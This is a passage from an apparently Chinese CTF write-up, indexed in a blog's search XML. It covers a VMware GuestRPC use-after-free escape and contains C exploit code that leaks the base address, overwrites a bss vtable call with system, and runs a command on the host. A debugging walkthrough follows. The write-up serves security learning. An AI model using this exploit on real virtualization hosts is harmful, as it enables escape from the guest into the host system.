punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"leak2 success\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_recv_finish2</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>pay1<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>pay2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>pay3<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>pay4<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>pay4<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">leak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"text base :%p"</span><span class="token punctuation">,</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>其中修改了长亭师傅的一个魔数，目的是达到no enhanced。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-8b5cc9e9d5519e804249233cc339cad6311cbed7.png" alt="图片.png"></p><p>其中构造的exploit如下。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-62745268f78c644e67b21e14deae7cda0e266705.png" alt="图片.png"><br> 开启四个channel</p><p>然后free（0）</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-00e8aa2fa4011e8f00639154c8b15f85401f4144.png" alt="图片.png"></p><p>set之后再次free(0)</p><p>此时往channel 1 可以写入bss段的地址。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-1f029b2200ee309814087c541c99b32c5e947019.png" alt="图片.png"></p><p>此时fd被链接进去之后可以直接malloc出来然后改写即可。</p><p>此处覆盖的位置为bss段的一处调用</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-f0b3c90d5cbd2ef6d9dc12653e0de4722512a24b.png" alt="图片.png"></p><p>可以看出来这块的虚表调用位置在FE95B0，+8即为FE95B8，所以此处改为system然后第一个参数（FE95C0）改为，弹出计算器的指令即可。</p><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>打开环境，ssh链接guest，然后sudo gdb .&#x2F;vmx -q，使用ps -aux | grep vmx找到对应的进程，attach上去，在ssh端口运行exp即可（记得先打断点，我断在了漏洞函数free的地方，方便看chunk）</p><p>第一次free前</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-406d37c691e6e5004ec90acb50ec506407d0b61b.png" alt="图片.png"></p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a8120d076ec4a58750eae4727ea33c426a91e60b.png" alt="图片.png"></p><p>直接按了continue。。堆分配特别乱，于是重新来过。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-ec9d59dfbc0332422eecfd0c0d60b445d286bc22.png" alt="图片.png"></p><p>断点找出漏洞函数。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-8d71666bf6ee066a3c9f34c2a562979dee1b3712.png" alt="图片.png"></p><p>这是bufA的地址。记住0x7f35000210f0（user开头区域）</p><p>经过UAF之后，这里把虚表写入bufB，</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-cff1a526e7d67d1e98b8cef0b48deda4cc636949.png" alt="图片.png"></p><p>成功。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-71e566d153b0ff7626917e269648509ed147bf23.png" alt="图片.png"></p><p>查看后发现确实是vtable。</p><p>基址就可以leak出来了。后面是基本的劫持fd操作，不调试了，直接看到弹出计算器。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-fe93a41ccc7f68586129dd5cb19d8944c5f17d54.png" alt="图片.png"></p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="http://sysprogs.com/legacy/articles/kdvmware/guestrpc.shtml">http://sysprogs.com/legacy/articles/kdvmware/guestrpc.shtml</a></p><p><a href="https://github.com/vmware/open-vm-tools/tree/master/open-vm-tools/lib">https://github.com/vmware/open-vm-tools/tree/master/open-vm-tools/lib</a></p><p><a href="https://sites.google.com/site/chitchatvmback/backdoor">https://sites.google.com/site/chitchatvmback/backdoor</a></p><p><a href="https://zhuanlan.zhihu.com/p/27733895">https://zhuanlan.zhihu.com/p/27733895</a></p><p><a href="https://nafod.net/blog/2019/12/21/station-escape-vmware-pwn.html">https://nafod.net/blog/2019/12/21/station-escape-vmware-pwn.html</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>realworld</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
